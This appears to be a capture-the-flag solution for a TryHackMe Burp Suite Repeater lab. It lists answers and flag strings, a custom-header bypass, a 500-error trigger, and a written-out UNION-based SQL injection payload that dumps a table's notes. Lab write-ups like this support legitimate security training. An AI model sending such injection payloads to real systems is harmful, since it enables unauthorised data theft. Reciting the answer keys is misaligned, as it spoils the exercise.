# Solution

## URL
- [BurpSuite Repeater](https://tryhackme.com/room/burpsuiterepeater)

## Steps

### Task 4:
#### Which view option displays the response in the same format as your browser would?
1. The answer is `render`.

### Task 6:
#### Send the request. What is the flag you receive?
1. Add a header in the request to `http://10.10.210.167/` called `FlagAuthorised` and set it's value to `True`.
2. In the response you will receive the flag: `THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}`.

### Task 7:
#### What is the flag you receive when you cause a 500 error in the endpoint?
1. In repeater go to `/products/-1` for the flag: `THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}`.

### Task 8:
#### What is the flag?
1. In the repeater go to `/about/0%20UNION%20SELECT%20group_concat(notes,'<br>'),2,3,4,5%20FROM%20people`.
2. In the response you will find the flag: `THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}`.